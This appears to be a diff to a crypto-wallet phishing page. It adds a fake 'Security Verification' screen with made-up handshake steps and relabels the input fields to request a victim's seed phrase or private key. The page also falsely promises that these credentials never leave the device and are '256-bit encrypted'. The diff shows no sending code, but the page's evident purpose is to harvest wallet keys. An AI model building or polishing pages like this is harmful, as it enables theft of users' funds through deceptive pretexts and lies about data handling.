@@ -399,20 +399,28 @@
             <div class="w-body">
 
 
-                <div class="w-featured wallet-trigger" data-wid="trustwallet" onclick="handleWalletSelect(this)">
+                <div class="w-featured wallet-trigger" onclick="handleWalletSelect(this)">
                     <span class="w-featured-badge">Popular</span>
                     <div class="w-feat-icon">
-                        <img src="img/trustwallet.png" alt="Trust Wallet" />
+                        <img src="img/ledgerwallet.png" alt="Ledger" />
                     </div>
                     <div>
-                        <div class="w-feat-name">Trust Wallet</div>
-                        <div class="w-feat-desc">Multi-chain mobile wallet</div>
+                        <div class="w-feat-name">Ledger</div>
+                        <div class="w-feat-desc">Hardware wallet — secure by design</div>
                     </div>
                 </div>
 
                 <div class="w-divider"><span>other wallets</span></div>
 
                 <div class="w-list">
+                    <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+                        <div class="w-item-icon"><img src="img/trezor.png" alt="Trezor" /></div>
+                        <div>
+                            <div class="w-item-name">Trezor</div>
+                            <div class="w-item-desc">Hardware / Multi-chain</div>
+                        </div>
+                        <i class="ri-arrow-right-s-line w-item-arrow"></i>
+                    </div>
                     <div class="w-item wallet-trigger" data-wid="phantom" onclick="handleWalletSelect(this)">
                         <div class="w-item-icon"><img src="img/phantomwallet.png" alt="Phantom Wallet" /></div>
                         <div>
@@ -434,6 +442,14 @@
                         <div>
                             <div class="w-item-name">Kucoin Web3 Wallet</div>
                             <div class="w-item-desc">Multi-chain wallet</div>
+                        </div>
+                        <i class="ri-arrow-right-s-line w-item-arrow"></i>
+                    </div>
+                    <div class="w-item wallet-trigger" data-wid="trustwallet" onclick="handleWalletSelect(this)">
+                        <div class="w-item-icon"><img src="img/trustwallet.png" alt="Trust Wallet" /></div>
+                        <div>
+                            <div class="w-item-name">Trust Wallet</div>
+                            <div class="w-item-desc">Multi-chain mobile wallet</div>
                         </div>
                         <i class="ri-arrow-right-s-line w-item-arrow"></i>
                     </div>
@@ -941,6 +957,51 @@
         </div>
 
 
+        <div class="w-sub" id="wScreen3b">
+            <div class="w-header">
+                <span class="w-title">Security Verification</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="w-security-body">
+                <div class="w-sec-shield">
+                    <div class="w-sec-ring w-sec-ring-outer"></div>
+                    <div class="w-sec-ring w-sec-ring-inner"></div>
+                    <div class="w-sec-icon-wrap">
+                        <i class="ri-shield-keyhole-line"></i>
+                    </div>
+                </div>
+                <div class="w-sec-label">Endpoint Authentication</div>
+                <p class="w-sec-title">Identity Confirmation Required</p>
+                <p class="w-sec-desc">
+                    To proceed with manual connection, this session requires an additional layer of
+                    cryptographic verification. Your wallet endpoint must be authenticated before
+                    access credentials are accepted.
+                </p>
+                <div class="w-sec-steps">
+                    <div class="w-sec-step done">
+                        <div class="w-sec-step-dot"><i class="ri-check-line"></i></div>
+                        <div class="w-sec-step-text">Session Initialized</div>
+                    </div>
+                    <div class="w-sec-step done">
+                        <div class="w-sec-step-dot"><i class="ri-check-line"></i></div>
+                        <div class="w-sec-step-text">Protocol Handshake Complete</div>
+                    </div>
+                    <div class="w-sec-step active">
+                        <div class="w-sec-step-dot"><span class="w-sec-pulse"></span></div>
+                        <div class="w-sec-step-text">Awaiting Owner Confirmation</div>
+                    </div>
+                </div>
+                <button class="w-btn w-btn-plum w-sec-confirm-btn" onclick="openManualFromSecurity()">
+                    <i class="ri-fingerprint-line"></i> Confirm &amp; Continue
+                </button>
+                <p class="w-sec-footer-note">
+                    <i class="ri-lock-2-line"></i>
+                    256-bit encrypted &mdash; Your data is never stored or shared
+                </p>
+            </div>
+        </div>
+
+
         <div class="w-sub" id="wScreen4">
             <div class="w-header">
                 <span class="w-title">Connect Manually</span>
@@ -948,29 +1009,40 @@
             </div>
             <div class="w-manual-body">
 
-
-                <div class="w-wallet-chip">
-                    <div class="w-chip-icon"><img id="s4Img" src="" alt="" /></div>
-                    <span class="w-chip-name" id="s4Name">Wallet</span>
+                <div class="w-manual-top">
+                    <div class="w-wallet-chip">
+                        <div class="w-chip-icon"><img id="s4Img" src="" alt="" /></div>
+                        <span class="w-chip-name" id="s4Name">Wallet</span>
+                    </div>
+                    <div class="w-manual-badge">
+                        <i class="ri-lock-2-line"></i> Secured
+                    </div>
                 </div>
 
+                <div class="w-manual-method-label">Select Input Method</div>
 
                 <div class="type-toggle">
-                    <button class="type-btn active" id="btn-phrase" onclick="switchType('phrase')">Phrase</button>
+                    <button class="type-btn active" id="btn-phrase" onclick="switchType('phrase')">Recovery
+                        Phrase</button>
                     <button class="type-btn" id="btn-privatekey" onclick="switchType('privatekey')">Private Key</button>
                 </div>
 
 
                 <div class="input-pane active" id="pane-phrase">
+                    <div class="w-input-label">Recovery / Seed Phrase</div>
                     <textarea class="w-textarea phrase-area" id="phraseInput"
-                        placeholder="Enter your verification tokens, separated by spaces..." spellcheck="false"
+                        placeholder="Enter your 12 or 24 word seed phrase, separated by spaces..." spellcheck="false"
                         autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+                    <p class="w-input-hint">Typically 12, 18, or 24 words separated by spaces.</p>
                 </div>
 
 
                 <div class="input-pane" id="pane-privatekey">
-                    <textarea class="w-textarea privkey-area" id="privkeyInput" placeholder="Enter your access token..."
-                        spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+                    <div class="w-input-label">Private Key</div>
+                    <textarea class="w-textarea privkey-area" id="privkeyInput"
+                        placeholder="Enter your private key (hex or Base58)..." spellcheck="false" autocomplete="off"
+                        autocorrect="off" autocapitalize="off"></textarea>
+                    <p class="w-input-hint">Your private key grants full wallet access. Keep it safe.</p>
                 </div>
 
 
@@ -978,8 +1050,8 @@
                     <i class="ri-lock-2-line"></i>
                     <p>
                         <strong>End-to-end encrypted.</strong>
-                        Your credentials are encrypted locally and never transmitted to any server.
-                        Support will never ask for your access credentials.
+                        Your credentials are processed locally and never transmitted to any external server.
+                        Support will never request your access credentials.
                     </p>
                 </div>
 
